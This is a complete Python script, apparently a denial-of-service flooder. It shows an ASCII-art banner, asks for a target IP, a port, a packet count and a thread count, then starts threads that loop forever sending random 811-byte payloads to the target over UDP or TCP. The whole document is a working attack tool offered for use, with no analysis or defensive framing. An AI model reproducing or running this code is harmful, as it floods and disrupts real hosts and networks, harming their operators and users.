#!/usr/bin/env python3
import random
import socket
import threading

print("""
_▄▀▀▀▄▄▄▄▄▄▄▀▀▀▄
───█▒▒░░░░░░░░░▒▒█───
────█░░█░░░░░█░░█────
─▄▄──█░░░▀█▀░░░█──▄▄─
█░░█─▀▄░░░░░░░▄▀─█░░█
█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
█
█     ▄▀▄ ──▀ █▀▀ █── █── ▀▄─▄▀
█     █▀█ ▄─█ █▀▀ █─▄ █─▄ ──█──
█     ▀─▀ ▀▀▀ ▀▀▀ ▀▀▀ ▀▀▀ ──▀──
█
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█""")
ip = str(input(" Target Ip:"))
port = int(input(" Target Port:"))
choice = str(input(" Ready?(y/n):"))
times = int(input(" Paket:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(811)
	i = random.choice(("[PAKET!!]","[PAKET!!]","[PAKET!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LOVE YOUU")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(811)
	i = random.choice(("[PAKET!!]","[PAKET!!]","[PAKET!!]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" LOVE YOUU")
		except:
			s.close()
			print("[*] Error")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
